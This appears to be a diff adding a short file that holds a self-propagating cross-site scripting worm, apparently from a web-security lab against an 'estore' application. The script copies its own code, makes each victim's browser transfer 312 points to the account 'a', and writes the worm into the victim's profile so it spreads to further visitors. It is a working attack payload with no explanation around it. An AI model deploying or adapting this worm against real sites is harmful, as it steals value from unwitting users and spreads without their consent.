@@ -1,0 +1,25 @@
+## xss_selfProp.js
+```markdown
+<script id="selfProp">
+
+var begin = "<script id=\"selfProp\">";
+var internalCode = document.getElementById("selfProp").innerHTML;
+var end = "</"+"script>";
+var selfPropagatingCode = encodeURIComponent(begin+internalCode+end);
+ 
+var urlRequest="http://114.70.37.212/~estore/cgi-bin/process_points_transfer.php?transferee=a&points=312"; 
+var AjaxRequest = new XMLHttpRequest();
+AjaxRequest.open("GET", urlRequest, true);
+AjaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+AjaxRequest.setRequestHeader("Host", "114.70.37.212");
+AjaxRequest.send();
+
+var urlRequest="http://114.70.37.212/~estore/cgi-bin/process_personal_profile.php?profile="+selfPropagatingCode; 
+var AjaxRequest = new XMLHttpRequest();
+AjaxRequest.open("GET", urlRequest, true);
+AjaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+AjaxRequest.setRequestHeader("Host", "114.70.37.212");
+AjaxRequest.send();
+
+</script>
+```
